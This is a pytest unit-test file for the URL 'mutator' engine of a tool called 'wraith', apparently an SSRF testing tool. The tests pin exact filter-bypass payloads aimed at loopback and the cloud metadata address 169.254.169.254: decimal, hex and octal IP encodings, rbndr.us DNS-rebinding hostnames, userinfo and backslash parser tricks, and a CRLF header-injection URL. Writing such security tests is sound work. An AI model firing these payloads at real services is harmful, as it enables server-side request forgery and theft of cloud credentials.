"""Tier-0 unit tests for the filter-bypass mutator engine (V0.1-CRITERIA.md #2).

The largest, fastest tier: exact-byte ``parametrize`` assertions on every
mutator. Expected bytes are hardcoded (never derived from the code under test)
so a regression in an encoder is caught. The two contract-pinned worked
examples are asserted explicitly:

    127.0.0.1        -> 2130706433 / 0x7f000001 / 0177.0.0.1
    169.254.169.254  -> 2852039166 / 0xa9fea9fe

Hermetic: pure string transforms, zero I/O (runs under pytest-socket lock).
"""

from __future__ import annotations

import pytest

from wraith import mutators as m
from wraith.mutators import Variant, build_variants

# --------------------------------------------------------------------------- #
# Exact-byte IP encodings (the contract's mandate)
# --------------------------------------------------------------------------- #

# (ip, dword, hex_dotless, hex_dotted, octal_dotted, octal_dotless, shorthand,
#  mapped, mapped_hex)
_IP_VECTORS = [
    (
        "127.0.0.1",
        "2130706433",
        "0x7f000001",
        "0x7f.0x0.0x0.0x1",
        "0177.0.0.1",
        "017700000001",
        "127.1",
        "[::ffff:127.0.0.1]",
        "[::ffff:7f00:1]",
    ),
    (
        "169.254.169.254",
        "2852039166",
        "0xa9fea9fe",
        "0xa9.0xfe.0xa9.0xfe",
        "0251.0376.0251.0376",
        "025177524776",
        "169.16689662",
        "[::ffff:169.254.169.254]",
        "[::ffff:a9fe:a9fe]",
    ),
    (
        "0.0.0.0",
        "0",
        "0x00000000",
        "0x0.0x0.0x0.0x0",
        "0.0.0.0",
        "00",
        "0.0",
        "[::ffff:0.0.0.0]",
        "[::ffff:0:0]",
    ),
    (
        "10.0.0.1",
        "167772161",
        "0x0a000001",
        "0xa.0x0.0x0.0x1",
        "012.0.0.1",
        "01200000001",
        "10.1",
        "[::ffff:10.0.0.1]",
        "[::ffff:a00:1]",
    ),
]


@pytest.mark.parametrize(
    "ip,dword,hexdl,hexd,octd,octdl,short,mapped,mappedhex",
    _IP_VECTORS,
    ids=[v[0] for v in _IP_VECTORS],
)
def test_ipv4_encoding_exact_bytes(ip, dword, hexdl, hexd, octd, octdl, short, mapped, mappedhex):
    assert m.to_dword(ip) == dword
    assert m.to_hex_dotless(ip) == hexdl
    assert m.to_hex_dotted(ip) == hexd
    assert m.to_octal_dotted(ip) == octd
    assert m.to_octal_dotless(ip) == octdl
    assert m.to_shorthand(ip) == short
    assert m.to_ipv4_mapped_ipv6(ip) == mapped
    assert m.to_ipv4_mapped_ipv6_hex(ip) == mappedhex


def test_contract_pinned_examples_127():
    # Verbatim from V0.1-CRITERIA.md #2 / Testability Tier 0.
    assert m.to_dword("127.0.0.1") == "2130706433"
    assert m.to_hex_dotless("127.0.0.1") == "0x7f000001"
    assert m.to_octal_dotted("127.0.0.1") == "0177.0.0.1"


def test_contract_pinned_examples_metadata():
    # Verbatim from V0.1-CRITERIA.md #2 / Testability Tier 0.
    assert m.to_dword("169.254.169.254") == "2852039166"
    assert m.to_hex_dotless("169.254.169.254") == "0xa9fea9fe"


def test_dword_doubles_as_zero_shorthand():
    # The contract lists shorthand "127.1"/"0"; the bare 0 form is the dword.
    assert m.to_dword("0.0.0.0") == "0"


def test_encodings_round_trip_to_same_address():
    # Every dword/hex/octal encoding must denote the SAME 32-bit address (so the
    # bypass actually reaches the intended target, not a random host).
    import ipaddress

    for ip, *_ in _IP_VECTORS:
        n = int(ipaddress.IPv4Address(ip))
        assert int(m.to_dword(ip)) == n
        assert int(m.to_hex_dotless(ip), 16) == n
        assert int(m.to_octal_dotless(ip), 8) == n


# --------------------------------------------------------------------------- #
# is_ipv4_literal
# --------------------------------------------------------------------------- #

@pytest.mark.parametrize(
    "host,expected",
    [
        ("127.0.0.1", True),
        ("169.254.169.254", True),
        ("0.0.0.0", True),
        ("metadata.google.internal", False),
        ("example.com", False),
        ("2130706433", False),  # a dword int is not dotted-quad
        ("::1", False),
        ("", False),
    ],
)
def test_is_ipv4_literal(host, expected):
    assert m.is_ipv4_literal(host) is expected


# --------------------------------------------------------------------------- #
# rbndr.us rebind hostname (emit-only)
# --------------------------------------------------------------------------- #

def test_rbndr_hostname_exact():
    assert m.rbndr_hostname("127.0.0.1") == "7f000001.01010101.rbndr.us"
    assert m.rbndr_hostname("169.254.169.254") == "a9fea9fe.01010101.rbndr.us"
    assert m.rbndr_hostname("10.0.0.1", public_ip="8.8.8.8") == "0a000001.08080808.rbndr.us"


def test_ipv6_loopback_only_for_loopback_target():
    names = {v.name for v in m.ipv4_encodings("127.0.0.1")}
    assert "ipv6-loopback" in names
    assert m.IPV6_LOOPBACK == "[::1]"
    # A non-loopback IPv4 target does not emit the IPv6-loopback variant.
    assert "ipv6-loopback" not in {v.name for v in m.ipv4_encodings("169.254.169.254")}


# --------------------------------------------------------------------------- #
# build_variants: URL-structure tricks + ordering + coverage
# --------------------------------------------------------------------------- #

_SEED = "http://169.254.169.254/latest/meta-data/"
_DECOY = "trusted.example"


def _by_name(url: str, decoy: str = _DECOY) -> dict[str, Variant]:
    return {v.name: v for v in build_variants(url, decoy=decoy)}


def test_url_structure_variants_exact_bytes():
    v = _by_name(_SEED)
    assert v["userinfo-at"].value == "http://trusted.example@169.254.169.254/latest/meta-data/"
    assert v["userinfo-at-multi"].value == (
        "http://trusted.example@trusted.example@169.254.169.254/latest/meta-data/"
    )
    assert v["fragment-hash"].value == "http://169.254.169.254/latest/meta-data/#@trusted.example"
    assert v["backslash"].value == "http://trusted.example\\@169.254.169.254/latest/meta-data/"
    assert v["whitespace-tab"].value == "http://trusted.example%09@169.254.169.254/latest/meta-data/"
    assert v["crlf-header-injection"].value == (
        "http://169.254.169.254/latest/meta-data/%0d%0aWraith-Canary:%201"
    )


def test_scheme_variants_exact_bytes():
    v = _by_name(_SEED)
    assert v["scheme-case"].value == "HtTp://169.254.169.254/latest/meta-data/"
    assert v["scheme-backslash"].value == "http:/\\/169.254.169.254/latest/meta-data/"


def test_encoding_variants_embed_encoded_host():
    v = _by_name(_SEED)
    assert v["dword-decimal"].value == "http://2852039166/latest/meta-data/"
    assert v["hex-dotless"].value == "http://0xa9fea9fe/latest/meta-data/"
    assert v["ipv4-mapped-ipv6-hex"].value == "http://[::ffff:a9fe:a9fe]/latest/meta-data/"
    assert v["dns-rebind-rbndr"].value == "http://a9fea9fe.01010101.rbndr.us/latest/meta-data/"


def test_default_ordering_matches_contract():
    # userinfo(@) -> dns-rebind -> parser-differential -> encoding -> scheme.
    families = [v.family for v in build_variants(_SEED, decoy=_DECOY)]
    first_idx = {}
    for i, fam in enumerate(families):
        first_idx.setdefault(fam, i)
    order = ["userinfo", "dns-rebind", "parser-differential", "encoding", "scheme"]
    seen = [first_idx[f] for f in order if f in first_idx]
    assert seen == sorted(seen), f"family order violated: {families}"


def test_full_catalog_covers_every_mutator_class():
    names = {v.name for v in build_variants(_SEED, decoy=_DECOY)}
    required = {
        "userinfo-at", "userinfo-at-multi",
        "dns-rebind-rbndr",
        "fragment-hash", "backslash", "whitespace-tab", "crlf-header-injection",
        "dword-decimal", "hex-dotless", "hex-dotted",
        "octal-dotted", "octal-dotless", "shorthand",
        "ipv4-mapped-ipv6", "ipv4-mapped-ipv6-hex",
        "scheme-case", "scheme-backslash",
    }
    missing = required - names
    assert not missing, f"missing mutators: {missing}"


def test_hostname_target_skips_ip_only_variants():
    # A hostname internal target has no IPv4 encodings and no rbndr rebind, but
    # keeps the URL-structure and scheme tricks.
    names = {v.name for v in build_variants("http://metadata.google.internal/computeMetadata/v1/")}
    assert "dword-decimal" not in names
    assert "dns-rebind-rbndr" not in names
    assert {"userinfo-at", "fragment-hash", "scheme-case"} <= names


def test_bare_host_defaults_to_http_and_root_path():
    v = _by_name("169.254.169.254")
    assert v["userinfo-at"].value == "http://trusted.example@169.254.169.254/"


def test_preserves_port_and_query():
    v = _by_name("http://127.0.0.1:6379/path?x=1")
    assert v["userinfo-at"].value == "http://trusted.example@127.0.0.1:6379/path?x=1"
    assert v["dword-decimal"].value == "http://2130706433:6379/path?x=1"


def test_mutate_is_build_variants_alias():
    assert m.mutate is build_variants
